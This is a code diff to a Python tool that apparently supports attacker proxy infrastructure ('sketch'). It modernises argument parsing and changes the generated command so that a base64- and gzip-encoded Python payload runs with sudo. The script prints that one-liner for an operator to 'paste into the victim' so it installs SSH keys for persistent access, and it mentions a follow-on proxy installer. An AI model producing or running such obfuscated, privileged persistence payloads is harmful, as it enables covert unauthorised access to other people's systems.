@@ -1,5 +1,6 @@
 #!/usr/bin/env python3
 
+import argparse
 import os
 import sys
 import base64
@@ -7,13 +8,22 @@ import io
 import gzip
 import re
 import tempfile
+from pathlib import Path
 
 logging = True
 
 
-def usage():
-    print("usage: %s <ssh public key path>" % sys.argv[0])
-    sys.exit(1)
+def parse_args():
+    parser_desc = "A tool facilitate proxying through sketch infrastructure."
+    parser = argparse.ArgumentParser(description=parser_desc)
+
+    parser.add_argument(
+        dest="key",
+        type=str,
+        help="The path to the ssh public key you would like to use.",
+    )
+
+    return parser.parse_args()
 
 
 def templify(template, replacements):
@@ -49,10 +59,17 @@ def nocomments(stuff):
 
 
 def main():
-    if len(sys.argv) < 2:
-        usage()
+    args = parse_args()
 
-    KEYPATH = sys.argv[1]
+    try:
+        KEYPATH = Path(args.key).absolute()
+
+        if not KEYPATH.exists():
+            raise
+
+    except:
+        print(f'[!] "{args.key}" does not exist!\n')
+        sys.exit(1)
 
     print("[*] SSH Key path: %s" % KEYPATH)
 
@@ -69,13 +86,14 @@ def main():
 
     SCRIPT = templify(SCRIPT_TEMPLATE, replacements)
     gzbased = gzbase(SCRIPT)
-    cmd = "echo %s | base64 -d | gzip -d | python" % gzbased.decode("ascii")
+    cmd = "echo %s | base64 -d | gzip -d | sudo python" % gzbased.decode("ascii")
     print("[+] paste the following into the victim as the user to install the keys to")
     print(cmd)
     f = tempfile.NamedTemporaryFile(delete=False)
     f.write(cmd.encode("ascii"))
     print("[+] This is also available to you in the file %s" % f.name)
-    print("[*] Once this commmand is ran on sketch as the user to install the keys to, run install_proxy.py <Proxyport> <Middle> <Edge> <User> <Key>")
+    print("[*] Once this command is ran on sketch as the user to install the keys to, run install_proxy.py "
+          "<Proxyport> <Middle> <Edge> <User> <Key>")
 
 
 if __name__ == "__main__":
